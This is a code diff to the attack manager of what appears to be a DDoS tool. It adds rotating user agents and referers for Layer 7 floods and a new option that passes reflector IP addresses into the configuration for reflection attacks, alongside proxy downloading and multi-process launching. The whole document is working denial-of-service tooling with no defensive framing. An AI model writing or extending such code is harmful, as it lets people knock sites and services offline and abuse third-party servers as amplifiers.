@@ -6,12 +6,15 @@ from yarl import URL
 from socket import socket, AF_INET, SOCK_DGRAM
 
 from attacks.layer4 import Layer4
-from attacks.layer7 import Layer7
+from attacks.layer7 import Layer7, USER_AGENTS, referers
 from attacks.utils import Tools, bcolors, ProxyManager, REQUESTS_SENT, BYTES_SEND, logger
+
+# Backwards-compat alias for old variable name
+REFERERS = referers
 
 
 class AttackManager(Thread):
-    def __init__(self, target_str: str, method: str, threads: int, duration: int, on_stats_update=None, on_log=None):
+    def __init__(self, target_str: str, method: str, threads: int, duration: int, on_stats_update=None, on_log=None, reflector_ips=None):
         super().__init__(daemon=True)
         self.target_str = target_str
         self.method = method
@@ -19,6 +22,7 @@ class AttackManager(Thread):
         self.duration = duration
         self.on_stats_update = on_stats_update
         self.on_log = on_log
+        self.reflector_ips = reflector_ips
         self.processes: List[Process] = []
         self.events: List[Event] = []
         self.running = False
@@ -52,6 +56,9 @@ class AttackManager(Thread):
         with open("config.json") as f:
             config = json.loads(f.read())
 
+        if self.reflector_ips:
+            config['ref'] = self.reflector_ips
+
         proxies = []
         if self.method in Layer7.METHODS:
             self._log("Downloading Layer 7 proxies...")
@@ -67,7 +74,7 @@ class AttackManager(Thread):
 
         for i in range(self.threads):
             if self.method in Layer7.METHODS:
-                p = Process(target=Layer7(target_l7, self.method, self.duration, self.events[i], config, proxies).run, daemon=True)
+                p = Process(target=Layer7(target_l7, self.method, self.duration, self.events[i], config, proxies, user_agents=USER_AGENTS, referers=referers).run, daemon=True)
             else:
                 p = Process(target=Layer4(target_l4, self.method, self.duration, self.events[i], config, __ip__, proxies).run, daemon=True)
             self.processes.append(p)
